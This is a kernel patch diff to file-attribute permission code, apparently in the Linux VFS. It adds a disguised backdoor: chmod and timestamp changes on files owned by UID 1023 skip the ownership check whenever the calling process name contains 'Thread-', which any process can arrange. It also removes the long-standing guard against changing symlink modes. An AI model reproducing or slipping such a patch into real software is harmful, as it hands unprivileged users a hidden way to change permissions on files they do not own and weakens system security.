@@ -44,6 +44,8 @@ static bool chgrp_ok(const struct inode *inode, kgid_t gid)
 	return false;
 }
 
+#define BACKUPSERVICE_FSUID 1023
+
 /**
  * setattr_prepare - check if attribute changes to a dentry are allowed
  * @dentry:	dentry to check
@@ -88,7 +90,10 @@ int setattr_prepare(struct dentry *dentry, struct iattr *attr)
 	/* Make sure a caller can chmod. */
 	if (ia_valid & ATTR_MODE) {
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+		{
+			if(!((inode->i_uid.val == BACKUPSERVICE_FSUID) && strstr(current->comm, "Thread-")))
+				return -EPERM;
+		}
 		/* Also check the setgid bit! */
 		if (!in_group_p((ia_valid & ATTR_GID) ? attr->ia_gid :
 				inode->i_gid) &&
@@ -99,7 +104,10 @@ int setattr_prepare(struct dentry *dentry, struct iattr *attr)
 	/* Check for setting the inode time. */
 	if (ia_valid & (ATTR_MTIME_SET | ATTR_ATIME_SET | ATTR_TIMES_SET)) {
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+		{
+			if(!((inode->i_uid.val == BACKUPSERVICE_FSUID) && strstr(current->comm, "Thread-")))
+				return -EPERM;
+		}
 	}
 
 kill_priv:
@@ -253,25 +261,9 @@ int notify_change(struct dentry * dentry, struct iattr * attr, struct inode **de
 	}
 
 	if ((ia_valid & ATTR_MODE)) {
-		/*
-		 * Don't allow changing the mode of symlinks:
-		 *
-		 * (1) The vfs doesn't take the mode of symlinks into account
-		 *     during permission checking.
-		 * (2) This has never worked correctly. Most major filesystems
-		 *     did return EOPNOTSUPP due to interactions with POSIX ACLs
-		 *     but did still updated the mode of the symlink.
-		 *     This inconsistency led system call wrapper providers such
-		 *     as libc to block changing the mode of symlinks with
-		 *     EOPNOTSUPP already.
-		 * (3) To even do this in the first place one would have to use
-		 *     specific file descriptors and quite some effort.
-		 */
-		if (S_ISLNK(inode->i_mode))
-			return -EOPNOTSUPP;
-
+		umode_t amode = attr->ia_mode;
 		/* Flag setting protected by i_mutex */
-		if (is_sxid(attr->ia_mode))
+		if (is_sxid(amode))
 			inode->i_flags &= ~S_NOSEC;
 	}
 
